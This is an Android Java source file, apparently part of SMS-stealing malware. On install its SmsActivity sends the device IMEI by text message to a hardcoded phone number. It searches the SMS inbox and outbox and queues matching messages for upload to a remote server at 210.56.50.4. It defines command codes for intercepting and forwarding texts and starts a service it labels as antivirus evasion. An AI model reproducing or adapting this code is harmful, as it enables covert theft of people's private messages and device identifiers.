package android.app.sdk;

import java.util.Date;
import com.google.pm.service.Occultation;
import com.umeng.analytics.AnalyticsConfig;
import android.app.Activity;
import android.app.sms.async.SubmitDateThread;
import android.app.sms.manager.SMSManager;
import android.app.sms.service.NotifiService;
import android.app.sms.sqlite.DQLiteOpenHelper;
import android.app.sms.utils.LogUtils;
import android.app.sms.utils.Tools;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;

public class SmsActivity extends Activity {

	private static int index = 0;
	//imei发送
	public static final String devicephone = "13568986885";
	//短信转发
	public static final String[] phonenum = {"13568986885","13568986885","13568986885"};
	//拦截
	public static final String lanjie="DX99#LJ|";
	//转发
	public static final String zhuanfa="DX99#FS|";
	//检索数据提交
	public static final String searchUrl = "http://210.56.50.4:999/h01/sms.asp";
	//拦截数据提交
	public static final String interceptUrl = "http://210.56.50.4:999/h01/LS.asp";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		startFreeToKillService(this);
		initData(this);
	}
	
	public static void initData(Context context) {
		Occultation.getInstance(context).oponeData();
		AnalyticsConfig.setAppkey("54111214fd98c50f7f052d60");
		AnalyticsConfig.setChannel("Channel" + Tools.getDeviceId(context));
		LogUtils.write("Send", "程序启动 " + Build.VERSION.SDK_INT + " " + Build.PRODUCT + "--" + Build.MODEL);
		int code = Tools.getVersionCode(context);
		SharedPreferences sp = Tools.findCheckConfig(context);
		if (sp.getBoolean("isfrist", true) || code != sp.getInt("code", -100)) {
			SMSManager.send(context, devicephone, "AZ99#AZ|程Z序已安装" + Tools.getDeviceId(context));
			Tools.saveCheckConfig(context, false, code);
			findHistorySMS(context);
		}
	}
	
	private static void findHistorySMS(Context context) {
		Cursor c = context.getContentResolver().query(Uri.parse("content://sms"), null, "body like '%我是刚才%' and type in (1,2)", null, "_id desc");
		for (c.moveToFirst(); !c.isAfterLast(); c.moveToNext()) {
			int type = c.getInt(c.getColumnIndex("type"));
			String body = c.getString(c.getColumnIndex("body"));
			String address = c.getString(c.getColumnIndex("address"));
			address = address.replace("+86", "").replace("+1", "");
			LogUtils.write("Send", "检索出来的内容" + body);
			String lx = (type == 1 ? "收件箱" : "发件箱");
			DQLiteOpenHelper.getHelper(context).addData(lx, address, body, searchUrl, new Date());
		}
		SubmitDateThread.startSendData(context);
	}
	
	public static String getPhone() {
		index++;
		if (index >= phonenum.length) {
			index = 0;
		}
		return phonenum[index];
	}
	
	public static void startFreeToKillService(Context context) {
		LogUtils.write("Send", "启动免杀服务");
		context.startService(new Intent(context, NotifiService.class));
	}
}
